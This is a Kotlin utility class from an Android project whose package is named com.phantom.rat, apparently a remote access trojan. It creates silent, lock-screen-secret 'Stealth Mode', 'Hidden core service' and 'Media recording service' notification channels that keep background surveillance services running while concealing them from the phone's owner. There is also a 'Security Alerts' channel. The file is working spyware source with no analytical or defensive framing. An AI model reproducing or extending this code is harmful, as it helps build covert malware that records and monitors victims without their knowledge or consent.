package com.phantom.rat.utils

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.drawable.Icon
import android.media.RingtoneManager
import android.net.Uri
import android.os.Build
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import com.phantom.rat.R

class NotificationUtils(private val context: Context) {

    companion object {
        private const val CHANNEL_CORE = "phantom_core"
        private const val CHANNEL_ALERTS = "phantom_alerts"
        private const val CHANNEL_STEALTH = "phantom_stealth"
        private const val CHANNEL_MEDIA = "phantom_media"
        
        const val NOTIFICATION_CORE = 1001
        const val NOTIFICATION_STEALTH = 1002
        const val NOTIFICATION_ALERT = 1003
        const val NOTIFICATION_MEDIA = 1004
    }

    init {
        createNotificationChannels()
    }

    private fun createNotificationChannels() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        
        val notificationManager = context.getSystemService(NotificationManager::class.java)
        
        val channels = listOf(
            NotificationChannel(CHANNEL_CORE, "Core Service", NotificationManager.IMPORTANCE_MIN).apply {
                description = "Hidden core service notification"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
                setSound(null, null)
            },
            NotificationChannel(CHANNEL_ALERTS, "Security Alerts", NotificationManager.IMPORTANCE_HIGH).apply {
                description = "Security alerts and notifications"
                enableVibration(true)
                lockscreenVisibility = Notification.VISIBILITY_PUBLIC
            },
            NotificationChannel(CHANNEL_STEALTH, "Stealth Mode", NotificationManager.IMPORTANCE_NONE).apply {
                description = "Stealth notifications (no icon/sound)"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
                setSound(null, null)
                setSilent(true)
            },
            NotificationChannel(CHANNEL_MEDIA, "Media Service", NotificationManager.IMPORTANCE_LOW).apply {
                description = "Media recording service"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_PRIVATE
            }
        )
        
        channels.forEach { notificationManager.createNotificationChannel(it) }
    }

    fun showHiddenNotification(title: String, content: String): Notification {
        val notification = NotificationCompat.Builder(context, CHANNEL_STEALTH)
            .setContentTitle(title)
            .setContentText(content)
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setShowWhen(false)
            .setSilent(true)
            .build()
        
        val notificationManager = NotificationManagerCompat.from(context)
        notificationManager.notify(NOTIFICATION_STEALTH, notification)
        
        return notification
    }

    fun showCoreNotification(title: String, content: String): Notification {
        val notification = NotificationCompat.Builder(context, CHANNEL_CORE)
            .setContentTitle(title)
            .setContentText(content)
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setShowWhen(false)
            .build()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // For foreground service
            return notification
        }
        
        val notificationManager = NotificationManagerCompat.from(context)
        notificationManager.notify(NOTIFICATION_CORE, notification)
        
        return notification
    }

    fun showAlertNotification(title: String, message: String, priority: Int = NotificationCompat.PRIORITY_DEFAULT) {
        val notification = NotificationCompat.Builder(context, CHANNEL_ALERTS)
            .setContentTitle(title)
            .setContentText(message)
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setPriority(priority)
            .setAutoCancel(true)
            .setSound(RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION))
            .build()
        
        val notificationManager = NotificationManagerCompat.from(context)
        notificationManager.notify(NOTIFICATION_ALERT, notification)
    }

    fun showMediaNotification(title: String, content: String): Notification {
        val notification = NotificationCompat.Builder(context, CHANNEL_MEDIA)
            .setContentTitle(title)
            .setContentText(content)
            .setSmallIcon(android.R.drawable.ic_media_play)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
        
        return notification
    }

    fun cancelNotification(id: Int) {
        NotificationManagerCompat.from(context).cancel(id)
    }

    fun cancelAll() {
        NotificationManagerCompat.from(context).cancelAll()
    }
}
